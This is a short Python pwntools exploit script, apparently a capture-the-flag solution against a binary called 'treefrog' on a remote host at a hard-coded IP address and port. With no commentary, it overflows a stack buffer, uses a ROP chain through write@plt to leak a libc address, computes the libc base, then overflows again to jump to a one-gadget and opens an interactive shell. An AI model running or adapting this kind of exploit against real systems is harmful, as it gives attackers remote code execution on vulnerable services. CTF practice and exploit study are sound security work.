from pwn import *

s = remote("121.170.91.17",10101)
e = ELF("./treefrog")

write_plt = e.plt['write']
write_got = e.got['write']
read_plt = e.plt['read']
main = 0x400577

libc_offset = 0xf72b0
magic_offset = 0x45216

prsi = 0x004006c1
prdi = 0x004006c3

payload = "A"*135+"\x00"*17
payload += p64(prsi)
payload += p64(write_got)
payload += p64(0)
payload += p64(write_plt)

payload += p64(main)

s.send(payload)
s.recv(0x87)
libc = u64(s.recv(8))
libc_base = libc - libc_offset
magic = libc_base + magic_offset

log.success("libc :"+hex(libc))
log.success("libc_base :"+hex(libc_base))
log.success("magic :"+hex(magic))
s.recv()
payload2 = "A"*135+"\x00"*17
payload2 += p64(magic)

s.send(payload2)
s.recv()
s.interactive()
